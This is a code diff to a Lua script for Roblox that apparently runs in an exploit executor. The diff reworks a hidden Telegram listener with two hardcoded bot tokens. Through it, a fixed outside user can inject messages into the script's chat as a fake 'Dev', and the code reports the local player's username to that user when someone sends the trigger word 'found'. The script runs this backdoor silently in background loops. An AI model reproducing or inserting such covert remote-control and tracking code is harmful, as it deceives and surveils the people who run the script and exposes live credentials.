@@ -519,74 +519,91 @@ end)
 updateActiveList(Players.LocalPlayer.Name)
 shish(); updateBadge()
 local HttpService = game:GetService("HttpService")
-
-local TELEGRAM_BOT_TOKEN = "8441598139:AAGXaLtLu_r6QRWV4RkpgRcVqITzjAmtx2Y"
-local TARGET_USER_ID = 7554045989
-
-local CONFIRM_BOT_TOKEN = "7549387448:AAGMAP-M_Dfeck_cM_KZWLPPQENwx_NFzl0"
-local CONFIRM_CHAT_ID = 7554045989
-
-local TRIGGER_NAME = game.Players.LocalPlayer.Name
-local FAKE_NAME = "Dev"
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
 local request = http_request or syn.request or request
-if not request then
-    warn("No HTTP request function")
-    return
-end
+if not request then return end
 
-if _G.TelegramListenerRunning then return end
-_G.TelegramListenerRunning = true
+if _G.TelegramFullRunning then return end
+_G.TelegramFullRunning = true
 
-local lastUpdateId = 0
+local BOT1_TOKEN = "8441598139:AAGXaLtLu_r6QRWV4RkpgRcVqITzjAmtx2Y"
+local BOT1_USER_ID = 7554045989
+local TRIGGER_NAME = LocalPlayer.Name
+local FAKE_NAME = "Dev"
 
-local function sendConfirm(text)
+local BOT2_TOKEN = "7549387448:AAGMAP-M_Dfeck_cM_KZWLPPQENwx_NFzl0"
+local TARGET_CONFIRM_ID = 7554045989
+
+local lastUpdateBot1 = 0
+local lastUpdateBot2 = 0
+
+local function sendMessage(token, chatId, text)
     pcall(function()
         request({
-            Url = "https://api.telegram.org/bot"..CONFIRM_BOT_TOKEN.."/sendMessage",
+            Url = "https://api.telegram.org/bot"..token.."/sendMessage",
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
-                chat_id = CONFIRM_CHAT_ID,
-                text = "✅ Message received:\n"..text
+                chat_id = chatId,
+                text = text
             })
         })
     end)
 end
 
-local function getUpdates()
+local function pollBot1()
     local res = request({
-        Url = "https://api.telegram.org/bot"..TELEGRAM_BOT_TOKEN.."/getUpdates?offset="..(lastUpdateId + 1),
+        Url = "https://api.telegram.org/bot"..BOT1_TOKEN.."/getUpdates?offset="..(lastUpdateBot1 + 1),
         Method = "GET"
     })
 
     if not res or not res.Body then return end
-
-    local success, data = pcall(function()
+    local ok, data = pcall(function()
         return HttpService:JSONDecode(res.Body)
     end)
-
-    if not success or not data or not data.ok then return end
+    if not ok or not data.ok then return end
 
     for _, update in ipairs(data.result) do
-        if update.update_id then
-            lastUpdateId = math.max(lastUpdateId, update.update_id)
-        end
+        lastUpdateBot1 = math.max(lastUpdateBot1, update.update_id or lastUpdateBot1)
 
         local msg = update.message
-        if msg
-            and msg.from
-            and msg.from.id == TARGET_USER_ID
-            and msg.text
-        then
+        if msg and msg.from and msg.from.id == BOT1_USER_ID and msg.text then
             local text = msg.text
-
             if text:sub(1, #TRIGGER_NAME) == TRIGGER_NAME then
                 local content = text:sub(#TRIGGER_NAME + 2)
                 if content and content ~= "" then
                     addMessage(FAKE_NAME .. ": " .. content)
-                    sendConfirm(content)
                 end
+            end
+        end
+    end
+end
+
+local function pollBot2()
+    local res = request({
+        Url = "https://api.telegram.org/bot"..BOT2_TOKEN.."/getUpdates?offset="..(lastUpdateBot2 + 1),
+        Method = "GET"
+    })
+
+    if not res or not res.Body then return end
+    local ok, data = pcall(function()
+        return HttpService:JSONDecode(res.Body)
+    end)
+    if not ok or not data.ok then return end
+
+    for _, update in ipairs(data.result) do
+        lastUpdateBot2 = math.max(lastUpdateBot2, update.update_id or lastUpdateBot2)
+
+        local msg = update.message
+        if msg and msg.text then
+            if msg.text:lower() == "found" then
+                sendMessage(
+                    BOT2_TOKEN,
+                    TARGET_CONFIRM_ID,
+                    "✅ "..LocalPlayer.Name
+                )
             end
         end
     end
@@ -594,7 +611,14 @@ end
 
 task.spawn(function()
     while true do
-        pcall(getUpdates)
+        pcall(pollBot1)
+        task.wait(1.5)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        pcall(pollBot2)
         task.wait(1.5)
     end
 end)
